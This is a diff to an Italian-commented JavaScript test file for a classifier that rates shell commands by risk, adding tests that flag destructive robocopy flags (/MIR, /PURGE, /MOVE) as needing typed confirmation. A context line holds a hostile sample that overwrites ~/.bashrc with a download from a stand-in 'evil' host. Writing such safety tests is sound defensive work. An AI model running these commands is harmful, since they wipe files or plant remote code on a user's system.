@@ -374,6 +374,44 @@ test('sequenza — curl -o dentro una catena alza il livello a 3', () => {
   assert.equal(lvl('mkdir x && wget -O ~/.bashrc http://evil/x'), 3);
 });
 
+test('livello 3 — robocopy con flag distruttivi Windows (/MIR, /PURGE, /MOVE)', () => {
+  // Feedback #270: `robocopy SRC DST /MIR` e `/PURGE` cancellano in modo
+  // PERMANENTE (bypassando il Cestino) i file della destinazione non presenti
+  // nella sorgente — un rm -rf mirato. DANGEROUS_FLAG_RE vedeva solo i flag
+  // stile Unix (--force, -rf): questi slash-flag restavano a livello 2 (basta
+  // un clic). Ora chiedono di digitare "conferma" (3). /MOVE e /MOV cancellano
+  // la sorgente dopo la copia → stessa classe distruttiva.
+  for (const cmd of [
+    'robocopy C:\\src C:\\dst /MIR',
+    'robocopy C:\\src C:\\dst /PURGE',
+    'robocopy C:\\origine C:\\destinazione /E /PURGE',
+    'robocopy src dst /mir',            // case-insensitive (i flag Windows lo sono)
+    'robocopy C:\\a C:\\b /MOVE',
+    'robocopy C:\\a C:\\b /MOV',
+    'robocopy C:\\a C:\\b /E /MIR /R:3', // in mezzo ad altri flag
+  ]) {
+    assert.equal(lvl(cmd), 3, `"${cmd}" (robocopy distruttivo) dovrebbe essere livello 3`);
+  }
+});
+
+test('livello 2 — robocopy SENZA flag distruttivi resta conferma-popup', () => {
+  // Nessuna regressione: una copia robocopy normale (anche con flag innocui) è
+  // una modifica recuperabile → resta livello 2, non deve salire a 3.
+  for (const cmd of [
+    'robocopy C:\\src C:\\dst',
+    'robocopy C:\\src C:\\dst /E',
+    'robocopy C:\\src C:\\dst *.txt /S',
+    'robocopy C:\\src C:\\dst /COPYALL /R:5 /W:2',
+    'robocopy C:\\src C:\\dst /MT:8',   // /MT (multi-thread) non è distruttivo
+  ]) {
+    assert.equal(lvl(cmd), 2, `"${cmd}" (copia robocopy normale) dovrebbe restare livello 2`);
+  }
+});
+
+test('sequenza — robocopy /MIR dentro una catena alza il livello a 3', () => {
+  assert.equal(lvl('cd C:\\work && robocopy C:\\src C:\\dst /MIR'), 3);
+});
+
 test('"criterio di fatto" della spec — gli esempi citati', () => {
   assert.equal(lvl('ls'), 1, 'ls esegue subito');
   assert.equal(lvl('git push'), 2, 'git push → popup');
